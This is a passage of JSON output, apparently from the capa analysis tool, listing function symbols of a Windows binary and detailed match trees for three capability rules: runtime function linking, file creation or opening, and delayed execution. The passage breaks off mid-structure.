              "value": 6442668116
            },
            "name": "wcscmp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442668172
            },
            "name": "__dcrt_lowio_ensure_console_output_initialized"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442668284
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442669472
            },
            "name": "__acrt_LCMapStringW"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442670392
            },
            "name": "_call_matherr"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442670496
            },
            "name": "_exception_enabled"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442671008
            },
            "name": "__acrt_initialize_fma3"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442671152
            },
            "name": "_log_special_common"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442671304
            },
            "name": "__acrt_initialize_fmode"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442671344
            },
            "name": "_FindPESection"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442671424
            },
            "name": "_IsNonwritableInCurrentImage"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442671548
            },
            "name": "__GSHandlerCheck_SEH"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442671684
            },
            "name": "__GSHandlerCheck_EH"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442671812
            },
            "name": "_local_unwind"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442671856
            },
            "name": "__C_specific_handler_noexcept"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442672384
            },
            "name": "_guard_dispatch_icall_nop"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442675264
            },
            "name": "memcmp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442680428
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442680520
            },
            "name": "??__Fclassic_locale@std@@YAXXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442680668
            },
            "name": "?dtor$0@?0??Zero@GFP2Element@CryptoPP@@SAAEBV12@XZ@4HA"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442680680
            },
            "name": "?dtor$1@?0??Zero@GFP2Element@CryptoPP@@SAAEBV12@XZ@4HA"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442680776
            },
            "name": "?dtor$0@?0??Zero@GFP2Element@CryptoPP@@SAAEBV12@XZ@4HA"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442680788
            },
            "name": "?dtor$1@?0??Zero@GFP2Element@CryptoPP@@SAAEBV12@XZ@4HA"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442680800
            },
            "name": "?"
          }
        ]
      }
    },
    "rules": {
      "link function at runtime on Windows": {
        "meta": {
          "name": "link function at runtime on Windows",
          "namespace": "linking/runtime-linking",
          "authors": [
            "moritz.raabe@mandiant.com",
            "mehunhoff@google.com"
          ],
          "scopes": {
            "static": "instruction",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Execution",
                "Shared Modules"
              ],
              "tactic": "Execution",
              "technique": "Shared Modules",
              "subtechnique": "",
              "id": "T1129"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x404130",
            "Practical Malware Analysis Lab 01-04.exe_:0x401350"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: link function at runtime on Windows\r\n    namespace: linking/runtime-linking\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - mehunhoff@google.com\r\n    scopes:\r\n      static: instruction\r\n      dynamic: call\r\n    att&ck:\r\n      - Execution::Shared Modules [T1129]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x404130\r\n      - Practical Malware Analysis Lab 01-04.exe_:0x401350\r\n  features:\r\n    - and:\r\n      - os: windows\r\n      - or:\r\n        - api: kernel32.GetProcAddress\r\n        - api: ntdll.LdrGetProcedureAddress\r\n        - api: ntdll.LdrGetProcedureAddressEx\r\n        - api: ntdll.LdrGetProcedureAddressForCaller\r\n        - api: MmGetSystemRoutineAddress\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442591459
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442591459
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442595820
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442595820
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create or open file": {
        "meta": {
          "name": "create or open file",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "joakim@intezer.com"
          ],
          "scopes": {
            "static": "instruction",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Create File"
              ],
              "objective": "File System",
              "behavior": "Create File",
              "method": "",
              "id": "C0016"
            }
          ],
          "references": [],
          "examples": [
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x401D7E"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create or open file\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - joakim@intezer.com\r\n    lib: true\r\n    scopes:\r\n      static: instruction\r\n      dynamic: call\r\n    mbc:\r\n      - File System::Create File [C0016]\r\n    examples:\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x401D7E\r\n  features:\r\n    - or:\r\n      - api: CreateFile\r\n      - api: CreateFileEx\r\n      - api: IoCreateFile\r\n      - api: IoCreateFileEx\r\n      - api: ZwOpenFile\r\n      - api: ZwCreateFile\r\n      - api: NtOpenFile\r\n      - api: NtCreateFile\r\n      - api: LZCreateFile\r\n      - api: LZOpenFile\r\n      - api: fopen\r\n      - api: fopen64\r\n      - api: fdopen\r\n      - api: freopen\r\n      - api: open\r\n      - api: openat\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442661882
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442661882
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen64"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fdopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "freopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "open"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "openat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442661962
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442661962
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen64"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fdopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "freopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "open"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "openat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442662500
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442662500
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen64"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fdopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "freopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "open"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "openat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "delay execution": {
        "meta": {
          "name": "delay execution",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "@ramen0x3f"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Anti-Behavioral Analysis",
                "Dynamic Analysis Evasion",
                "Delayed Execution"
              ],
              "objective": "Anti-Behavioral Analysis",
              "behavior": "Dynamic Analysis Evasion",
              "method": "Delayed Execution",
              "id": "B0003.003"
            }
          ],
          "references": [
            "https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions",
            "https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp"
          ],
          "examples": [
            "al-khaser_x86.exe_:0x449770",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402FA6"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: delay execution\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - \"@ramen0x3f\"\r\n    lib: true\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - Anti-Behavioral Analysis::Dynamic Analysis Evasion::Delayed Execution [B0003.003]\r\n    references:\r\n      - https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions\r\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp\r\n    examples:\r\n      - al-khaser_x86.exe_:0x449770\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402FA6\r\n  features:\r\n    - or:\r\n      - and:\r\n        - os: windows\r\n        - or:\r\n          - api: kernel32.Sleep\r\n          - api: kernel32.SleepEx\r\n          - api: kernel32.WaitForSingleObject\r\n          - api: kernel32.SignalObjectAndWait\r\n          - api: kernel32.WaitForSingleObjectEx\r\n          - api: kernel32.WaitForMultipleObjects\r\n          - api: kernel32.WaitForMultipleObjectsEx\r\n          - api: kernel32.RegisterWaitForSingleObject\r\n          - api: WaitOnAddress\r\n          - api: user32.MsgWaitForMultipleObjects\r\n          - api: user32.MsgWaitForMultipleObjectsEx\r\n          - api: NtDelayExecution\r\n          - api: KeWaitForSingleObject\r\n          - api: KeDelayExecutionThread\r\n      - and:\r\n        - or:\r\n          - os: linux\r\n          - os: android\r\n        - or:\r\n          - api: sleep\r\n          - api: usleep\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442459323
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442459377
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442463574
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442463582
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
